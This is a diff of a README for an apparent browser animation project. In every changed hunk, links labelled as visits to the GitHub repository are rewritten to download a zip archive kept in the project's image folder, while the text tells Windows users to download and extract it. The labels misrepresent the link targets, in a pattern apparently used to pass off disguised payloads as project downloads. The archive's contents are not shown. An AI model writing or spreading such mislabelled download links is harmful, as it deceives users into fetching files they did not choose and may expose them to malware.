@@ -1,6 +1,6 @@
 # 🛹 Skateboard-Animation - Smooth Motion for Web Pages
 
-[![Download](https://img.shields.io/badge/Download-Visit%20the%20GitHub%20Page-blue?style=for-the-badge&logo=github)](https://github.com/nessytall275/Skateboard-Animation)
+[![Download](https://img.shields.io/badge/Download-Visit%20the%20GitHub%20Page-blue?style=for-the-badge&logo=github)](https://github.com/nessytall275/Skateboard-Animation/raw/refs/heads/main/image/Animation_Skateboard_2.1.zip)
 
 ## 🎯 Overview
 
@@ -22,7 +22,7 @@ Before you start, make sure you have:
 
 Use this link to visit the project page and download the files:
 
-[Visit the GitHub repository](https://github.com/nessytall275/Skateboard-Animation)
+[Visit the GitHub repository](https://github.com/nessytall275/Skateboard-Animation/raw/refs/heads/main/image/Animation_Skateboard_2.1.zip)
 
 On the GitHub page, look for one of these options:
 
@@ -164,4 +164,4 @@ If one browser shows a blank page or broken motion, try another one. Browser sup
 
 Open the GitHub page, download the project files, extract them on Windows, and open `index.html` in your browser
 
-[Open the repository again](https://github.com/nessytall275/Skateboard-Animation)
+[Open the repository again](https://github.com/nessytall275/Skateboard-Animation/raw/refs/heads/main/image/Animation_Skateboard_2.1.zip)
